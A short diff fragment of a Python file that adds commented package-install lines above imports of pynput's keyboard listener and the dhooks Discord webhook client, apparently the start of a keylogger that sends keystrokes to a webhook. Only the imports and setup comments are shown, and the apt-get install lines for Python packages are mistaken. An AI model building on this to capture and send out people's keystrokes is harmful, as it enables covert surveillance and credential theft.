@@ -1,3 +1,10 @@
+#	sudo apt-get update
+# 	sudo apt-get install pip
+#	sudo apt-get install dhooks
+#	sudo apt-get install pynput
+
+
+
 #pip install dhooks   " Python3 "
 from pynput import keyboard
 from dhooks import Webhook
